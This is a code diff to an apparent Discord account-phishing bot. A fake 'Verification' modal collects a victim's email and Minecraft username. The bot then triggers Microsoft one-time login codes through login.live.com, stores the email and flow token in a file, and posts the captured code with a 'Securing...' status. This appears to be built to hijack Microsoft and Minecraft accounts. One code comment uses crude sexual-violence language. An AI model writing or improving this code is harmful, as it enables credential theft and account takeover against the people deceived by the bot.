@@ -1,8 +1,7 @@
 from discord import ui
-from data import Email
-import discord
 import datetime
 import requests
+import discord
 import json
 import time
 import re
@@ -35,7 +34,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
         # Check if Minecraft Username is valid
         # response = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{self.username.value}")
-        # To be implemented
+        # To be implemented or scraped 
 
         await interaction.response.defer()
 
@@ -49,7 +48,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         )
 
         # Sends OTP/Auth code
-        # forceotclogin is what triggers the code, spamming otps may lead to microsoft raping your ip 
+        # forceotclogin is what triggers the code, spamming otps may lead to microsoft raping the email for some time 
         emailInfo = requests.get(
             url = "https://login.live.com/GetCredentialType.srf",
             headers = {
@@ -73,6 +72,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 "username": self.email.value
             }
         ).json()
+        
         print(emailInfo)
         # Email does not exist
         if "Credentials" not in emailInfo:
@@ -222,7 +222,16 @@ class MyModalOne(ui.Modal, title="Verification"):
             secEmail = emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]
             print(f"Found security email: {secEmail["display"]}!")
 
-            Email = self.email.value
+            # Will be replace with a db in later updates
+            with open("data.json", "w+") as f:
+                json.dump(
+                    {
+                        "email": self.email.value, 
+                        "flowtoken": emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
+                    },
+                    f 
+                )
+
             await interaction.followup.send(
                 embed=discord.Embed(
                     title="Verification ✅",
@@ -233,15 +242,9 @@ class MyModalOne(ui.Modal, title="Verification"):
                 ephemeral = True
             )
 
-            Code_embed = discord.Embed(
-            title="Got OTP Verication",
-            description=f"**Email**\n```{Email}```\n**Code**\n```{self.box_three.value}```\n**Status**\n```Securing...```",
-            colour=0x008000
-        )
-
             sucessEmbed = discord.Embed (
                     title = f"Auth Verification",
-                    description=f"**Email**\n```{Email}```\n**Code**\n```{self.box_three.value}```\n**Status**\n```Waiting...```",
+                    description=f"**Email**\n```{self.email.value}```\n**Status**\n```Waiting for code...```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xA3A300,                           
             ).set_thumbnail(
